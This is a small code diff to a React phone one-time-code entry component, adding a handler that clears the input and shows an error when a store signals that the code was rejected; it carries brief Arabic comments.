@@ -9,6 +9,7 @@ import {
   isFormApproved,
   isFormRejected,
   navigateToPage,
+  codeAction,
 } from "@/lib/store";
 
 const serviceProviderNextPages: Record<string, string> = {
@@ -61,6 +62,17 @@ export default function PhoneOTP() {
       inputRef.current?.focus();
     }
   }, [isFormRejected.value]);
+
+  // Handle code action (reject) - يبقي العميل على نفس الصفحة مع رسالة خطأ
+  useEffect(() => {
+    if (codeAction.value?.action === 'reject') {
+      setOtp("");
+      setError(true);
+      inputRef.current?.focus();
+      // إعادة تعيين codeAction بعد المعالجة
+      codeAction.value = null;
+    }
+  }, [codeAction.value]);
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
